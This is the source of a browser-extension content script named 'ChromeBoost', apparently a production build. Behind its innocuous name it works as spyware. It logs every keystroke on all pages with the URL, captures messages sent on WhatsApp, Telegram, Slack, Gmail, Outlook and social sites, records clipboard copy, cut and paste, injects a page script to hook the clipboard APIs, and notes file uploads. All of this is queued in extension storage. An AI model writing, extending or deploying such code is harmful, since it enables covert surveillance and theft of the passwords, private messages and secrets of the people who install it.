// ============================================================
// ChromeBoost Extension — content.js (Production)
// v2.3.0: Clipboard capture overhaul
//   - copy + cut, reading the real clipboard payload (not just selection)
//   - paste capture (links copied elsewhere, e.g. WhatsApp Desktop)
//   - main-world hook for button "Copy link" (async Clipboard API /
//     execCommand('copy')) which fire no copy event in the isolated world
//   - runs in all frames (manifest all_frames:true)
// ============================================================

const CHAT_PLATFORMS = {
  "web.whatsapp.com":  { name: "WhatsApp Web",      selector: '[contenteditable="true"][data-tab]',        sendKey: true  },
  "web.telegram.org":  { name: "Telegram Web",       selector: ".input-message-input",                      sendKey: true  },
  "slack.com":         { name: "Slack",               selector: ".ql-editor[contenteditable='true']",        sendKey: true  },
  "mail.google.com":   { name: "Gmail",               selector: '[contenteditable="true"][aria-label]',      sendKey: false },
  "outlook.com":       { name: "Outlook",             selector: '[contenteditable="true"]',                  sendKey: false },
  "facebook.com":      { name: "Facebook Messenger",  selector: '[contenteditable="true"][role="textbox"]',  sendKey: true  },
  "instagram.com":     { name: "Instagram DM",        selector: '[contenteditable="true"][aria-label]',      sendKey: true  },
};

function getPlatform() {
  const host = location.hostname.replace("www.", "");
  for (const [domain, cfg] of Object.entries(CHAT_PLATFORMS)) {
    if (host.includes(domain)) return { domain, ...cfg };
  }
  return null;
}

const platform = getPlatform();

// ── Save to chrome.storage (works even when SW is sleeping) ──────────────────
const EXT_VERSION = (() => { try { return chrome.runtime.getManifest().version; } catch { return "unknown"; } })();

function saveEvent(type, data) {
  const key = "cb_pending_" + Date.now() + "_" + Math.random().toString(36).slice(2, 7);
  chrome.storage.local.set({
    [key]: { event_type: type, event_data: { ...data, extension_version: EXT_VERSION }, recorded_at: new Date().toISOString() }
  });
}

// ── Global keydown capture ────────────────────────────────────────────────────
let keystrokeBuffer = "";
let keystrokeTimer  = null;

document.addEventListener("keydown", (e) => {
  if (["Shift","Control","Alt","Meta","CapsLock","Tab","Escape",
       "ArrowUp","ArrowDown","ArrowLeft","ArrowRight",
       "Home","End","PageUp","PageDown","Insert",
       "F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"].includes(e.key)) {
    return;
  }
  if (e.key === "Enter")          keystrokeBuffer += "\n";
  else if (e.key === "Backspace") keystrokeBuffer += "[⌫]";
  else if (e.key === "Delete")    keystrokeBuffer += "[Del]";
  else if (e.key === " ")         keystrokeBuffer += " ";
  else if (e.key.length === 1)    keystrokeBuffer += e.key;

  clearTimeout(keystrokeTimer);
  keystrokeTimer = setTimeout(() => {
    if (keystrokeBuffer.trim().length === 0) return;
    saveEvent("keystroke_text", {
      text:       keystrokeBuffer,
      field_type: "keydown_global",
      is_chat:    !!platform,
      domain:     location.hostname.replace("www.", ""),
      url:        location.href,
      source:     "browser",
    });
    keystrokeBuffer = "";
  }, 3000);
}, true);

// ── Chat send detection ───────────────────────────────────────────────────────
if (platform) {
  if (platform.sendKey) {
    document.addEventListener("keydown", (e) => {
      if (e.key !== "Enter" || e.shiftKey) return;
      const el = document.querySelector(platform.selector);
      if (!el) return;
      const msg = (el.value || el.innerText || el.textContent || "").trim();
      if (msg.length > 0) saveEvent("chat_message_sent", { platform: platform.name, message: msg, domain: location.hostname.replace("www.", ""), source: "browser" });
    }, true);
  }
  if (!platform.sendKey) {
    document.addEventListener("click", (e) => {
      const btn = e.target.closest('[data-tooltip="Send"],[aria-label="Send"],[aria-label="Send email"],button[type="submit"]');
      if (!btn) return;
      const el = document.querySelector(platform.selector);
      if (!el) return;
      const msg = (el.value || el.innerText || el.textContent || "").trim();
      if (msg.length > 0) saveEvent("chat_message_sent", { platform: platform.name, message: msg, domain: location.hostname.replace("www.", ""), source: "browser" });
    }, true);
  }
}

// ── Clipboard ─────────────────────────────────────────────────────────────────
// `capture` records how we saw it so we can tune later:
//   selection | clipboardData | async | paste
function logClip(capture, text) {
  if (text == null) return;
  const t = String(text);
  if (t.trim().length === 0) return;
  saveEvent("clipboard_copy", {
    text:    t.slice(0, 20000),
    length:  t.length,
    capture,
    domain:  location.hostname.replace("www.", ""),
    source:  "browser",
  });
}

// 1) Real copy / cut — prefer the actual clipboard payload, fall back to selection.
document.addEventListener("copy", (e) => {
  let text = "";
  try { text = e.clipboardData?.getData("text/plain") || ""; } catch (_) {}
  if (!text) text = window.getSelection()?.toString() || "";
  logClip("clipboardData", text);
}, true);
document.addEventListener("cut", (e) => {
  let text = "";
  try { text = e.clipboardData?.getData("text/plain") || ""; } catch (_) {}
  if (!text) text = window.getSelection()?.toString() || "";
  logClip("clipboardData", text);
}, true);

// 2) Paste — catches links copied OUTSIDE the browser (e.g. WhatsApp Desktop,
//    another app) and pasted into a page here.
document.addEventListener("paste", (e) => {
  let text = "";
  try { text = e.clipboardData?.getData("text/plain") || ""; } catch (_) {}
  logClip("paste", text);
}, true);

// 3) Button "Copy link" via the async Clipboard API / execCommand('copy').
//    These fire NO copy event and are invisible to the isolated content world,
//    so hook them in the page's MAIN world and relay via postMessage.
//    (Best-effort: pages with a strict CSP may block the injected script; the
//    copy/cut/paste listeners above still work there.)
(function injectClipboardHook() {
  try {
    const s = document.createElement("script");
    s.textContent =
      "(function(){try{" +
      "var send=function(t){try{if(t&&String(t).trim())window.postMessage({__cb_clip:1,text:String(t)},'*');}catch(e){}};" +
      "if(navigator.clipboard&&navigator.clipboard.writeText){var o=navigator.clipboard.writeText.bind(navigator.clipboard);" +
      "navigator.clipboard.writeText=function(d){send(d);return o(d);};}" +
      "var oe=document.execCommand.bind(document);document.execCommand=function(c){if(String(c).toLowerCase()==='copy'){try{send((window.getSelection&&window.getSelection().toString())||'');}catch(e){}}return oe.apply(document,arguments);};" +
      "}catch(e){}})();";
    (document.head || document.documentElement).appendChild(s);
    s.remove();
  } catch (_) {}
})();

window.addEventListener("message", (e) => {
  if (e.source === window && e.data && e.data.__cb_clip) logClip("async", e.data.text);
});

// ── File uploads ──────────────────────────────────────────────────────────────
document.addEventListener("change", (e) => {
  if (e.target?.type !== "file" || !e.target.files?.length) return;
  Array.from(e.target.files).forEach(file => {
    saveEvent("file_upload", { filename: file.name, size: file.size, filetype: file.type, domain: location.hostname.replace("www.", ""), source: "browser" });
  });
}, true);
